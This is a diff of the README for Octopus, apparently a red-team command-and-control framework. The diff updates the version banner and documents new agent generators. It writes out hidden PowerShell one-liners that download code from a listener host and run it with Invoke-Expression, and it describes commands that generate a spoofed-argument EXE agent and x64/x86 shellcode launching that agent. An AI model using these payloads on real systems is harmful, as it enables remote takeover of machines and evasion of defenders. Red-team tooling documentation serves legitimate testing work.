@@ -66,28 +66,32 @@ After that you can start the octopus server by running the following :
 You will by greeted with the following once you run it :
 
 ```
-┌─[root@kali]─[/opt/Octopus]
-└──╼ $./octopus.py
+┌─[askar@hackbook]─[/opt/redteaming/Octopus]
+└──╼ $python3 octopus.py
 
 
 
-.88888.   a88888b. d888888P  .88888.   888888ba  dP     dP .d88888b
-d8'   `8b d8'   `88    88    d8'   `8b  88    `8b 88     88 88.    "'
-88     88 88           88    88     88 a88aaaa8P' 88     88 `Y88888b.
-88     88 88           88    88     88  88        88     88       `8b
-Y8.   .8P Y8.   .88    88    Y8.   .8P  88        Y8.   .8P d8'   .8P
-`8888P'   Y88888P'    dP     `8888P'   dP        `Y88888P'  Y88888P
+      ___           ___                       ___           ___         ___           ___
+     /  /\         /  /\          ___        /  /\         /  /\       /__/\         /  /\
+    /  /::\       /  /:/         /  /\      /  /::\       /  /::\      \  \:\       /  /:/_
+   /  /:/\:\     /  /:/         /  /:/     /  /:/\:\     /  /:/\:\      \  \:\     /  /:/ /\
+  /  /:/  \:\   /  /:/  ___    /  /:/     /  /:/  \:\   /  /:/~/:/  ___  \  \:\   /  /:/ /::\
+ /__/:/ \__\:\ /__/:/  /  /\  /  /::\    /__/:/ \__\:\ /__/:/ /:/  /__/\  \__\:\ /__/:/ /:/\:\
+ \  \:\ /  /:/ \  \:\ /  /:/ /__/:/\:\   \  \:\ /  /:/ \  \:\/:/   \  \:\ /  /:/ \  \:\/:/~/:/
+  \  \:\  /:/   \  \:\  /:/  \__\/  \:\   \  \:\  /:/   \  \::/     \  \:\  /:/   \  \::/ /:/
+   \  \:\/:/     \  \:\/:/        \  \:\   \  \:\/:/     \  \:\      \  \:\/:/     \__\/ /:/
+    \  \::/       \  \::/          \__\/    \  \::/       \  \:\      \  \::/        /__/:/
+     \__\/         \__\/                     \__\/         \__\/       \__\/         \__\/
 
 
-
-
-                    v1.0 stable !
+                    v1.2 stable !
 
 
  Octopus C2 | Control your shells
 
 
 Octopus >>
+
 ```
 # Usage
 
@@ -288,7 +292,7 @@ Octopus >>generate_powershell operation1
 
 2) powershell -w hidden "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"
 
-3) powershell -w hidden "$m = (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');Invoke-Expression $m;"
+3) powershell -w hidden "$w = (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');Invoke-Expression $w;"
 
 Note - For Windows 7 clients you may need to prefix the payload with "Add-Type -AssemblyName System.Core;"
        e.g. powershell -w hidden "Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"
@@ -296,6 +300,7 @@ Note - For Windows 7 clients you may need to prefix the payload with "Add-Type -
 Hack your way in ;)
 #====================
 
+Octopus >>
 ```
 
 Now we can use this oneliner to start our agent.
@@ -334,6 +339,44 @@ Octopus >>
 ```
 
 > Please note that you have to install mono-csc to compile the C# source.
+
+***Octopus Spoofed arguments agent***
+
+You can generate a new EXE agent that will run a Powershell process with spoofed arguments based on [Adam Chester's brilliant research](https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/).
+
+To generate this exe, you can use the following command:
+
+```
+Octopus >>generate_spoofed_args_exe
+[-] Please select a listener and check your options !
+Syntax :  generate_spoofed_args_exe listener_name output_path
+Example : generate_spoofed_args_exe listener1 /opt/Octopus/file.exe
+Octopus >>
+```
+
+***Generate x64 shellcode and x86 shellcode***
+
+Octopus can generate both x64 and x86 shellcode starting from version 1.2, the generated shellcode is using CreateProcessA to start powershell.exe oneliner that will launch powershell agent.
+
+To generate x64 shellcode, you can use the following command:
+
+```
+Octopus >>generate_x64_shellcode
+[-] Please select a listener and check your options !
+Syntax :  generate_x64_shellcode listener_name
+Example : generate_x64_shellcode listener1
+Octopus >>
+```
+
+To generate x86 shellcode, you can use the following command:
+
+```
+Octopus >>generate_x86_shellcode
+[-] Please select a listener and check your options !
+Syntax :  generate_x86_shellcode listener_name
+Example : generate_x86_shellcode listener1
+Octopus >>
+```
 
 ### Interacting with agents
 
